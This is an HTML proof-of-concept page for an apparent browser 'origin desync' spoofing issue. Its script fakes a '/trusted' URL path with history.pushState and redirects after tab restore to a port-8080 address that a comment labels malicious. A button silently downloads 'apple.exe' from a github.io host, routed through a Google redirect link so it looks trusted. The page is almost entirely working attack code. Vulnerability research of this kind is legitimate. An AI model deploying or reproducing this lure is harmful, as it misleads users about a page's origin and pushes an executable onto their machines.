<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Origin Desync with Custom Download Link PoC</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
body {
  margin:0;
  font-family:-apple-system,BlinkMacSystemFont,system-ui;
  background:#f5f5f7;
}

button {
  margin:40px;
  font-size:18px;
  padding:10px 18px;
}

#panel {
  display:none;
  max-width:420px;
  margin:80px auto;
  background:#fff;
  padding:24px;
  border-radius:16px;
  box-shadow:0 20px 60px rgba(0,0,0,.2);
}

h2 { text-align:center; margin-bottom:6px; }
.sub { text-align:center; color:#666; margin-bottom:20px; }

.notice {
  margin-top:14px;
  font-size:13px;
  color:#b00020;
}

.download-button {
  margin-top:20px;
  width:100%;
  padding:12px;
  font-size:16px;
  border-radius:10px;
  border:none;
  background:#007aff;
  color:#fff;
}
</style>
</head>

<body>

<div style="text-align:center">
  <button id="trigger">Start PoC</button>
</div>

<div id="panel">
  <h2>Download File</h2>
  <div class="sub">Click below to download a custom file.</div>

  <!-- Custom Download Link -->
  <button class="download-button" onclick="downloadCustomFile()">Download Custom File</button>

  <div class="notice">
    Demo only — file is being downloaded from the exact provided URL.
  </div>
</div>

<script>
const panel = document.getElementById('panel');
const trigger = document.getElementById('trigger');

// Function to trigger download with custom URL
function downloadCustomFile() {
  const fileUrl = 'https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fapple.exe&sa=D&sntz=1&usg=AOvVaw1T8ZmQt3x7S7E2wgJuyMLe'; // Custom URL

  // Create an invisible anchor tag to trigger the download
  const downloadLink = document.createElement('a');
  downloadLink.href = fileUrl;
  downloadLink.download = 'apple.exe'; // Optional: You can specify the filename here
  document.body.appendChild(downloadLink);
  downloadLink.click(); // Trigger the download
  document.body.removeChild(downloadLink); // Clean up
}

trigger.onclick = () => {
  // Mimic the trusted origin behavior
  history.pushState({}, '', '/trusted');
  panel.style.display = 'block';
};

// Trigger navigation AFTER tab restore (mimics desync)
window.addEventListener('pageshow', () => {
  requestAnimationFrame(() => {
    requestAnimationFrame(() => {
      setTimeout(() => {
        location.href = 'http://google.com:8080'; // Malicious URL to simulate context change
      }, 80);
    });
  });
});
</script>

</body>
</html>
